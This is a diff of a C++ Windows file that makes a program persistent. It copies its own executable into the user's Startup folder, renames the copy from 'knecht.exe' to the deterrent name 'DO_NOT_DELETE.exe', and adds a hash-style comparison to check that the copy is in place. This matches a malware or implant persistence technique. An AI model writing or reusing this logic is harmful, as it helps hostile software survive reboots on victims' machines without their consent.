@@ -5,21 +5,26 @@
  * @date 27.11.2023
  */
 
-#include <iostream>
 #include <fstream>
+#include <filesystem>
 #include <stdexcept>
 
+
 #include "../../include/persistance/persistance.hpp"
+#include "../../include/util/util.hpp"
 #include "../../include/errorMessages.hpp"
+
+constexpr auto MAXLENGTH = 1024*1024*10;
 
 persistance::persistance(char const* argv[]) {
     wchar_t* localAppData = 0;
     SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &localAppData);
     std::wstring fullPath(localAppData);
-    fullPath += std::wstring(L"\\Startup\\knecht.exe");
+    fullPath += std::wstring(L"\\Startup\\DO_NOT_DELETE.exe");
     this->fullPath = fullPath;
     CoTaskMemFree(static_cast<void*>(localAppData));
 }
+
 persistance::~persistance() {
     this->fullPath.clear();
 }
@@ -37,9 +42,15 @@ bool persistance::persist(char const* argv[]) {
 }
 
 bool persistance::checkPersist(char const* argv[]) {
-    // TODO: Check if file exists at this->fullPath and compare hashes with argv[0]
+    util::File fileOnDisk = util::getFile(this->fullPath);
+    util::File thisFile = util::getFile(argv[0]);
+
+    if (fileOnDisk.buffer == NULL || util::filecmp(fileOnDisk, thisFile))
+        return false;
+
     return true;
 }
+
 bool persistance::makePersistent(char const* argv[]) {
     std::ifstream src(argv[0], std::ios::binary);
     std::ofstream dst(this->fullPath, std::ios::binary);
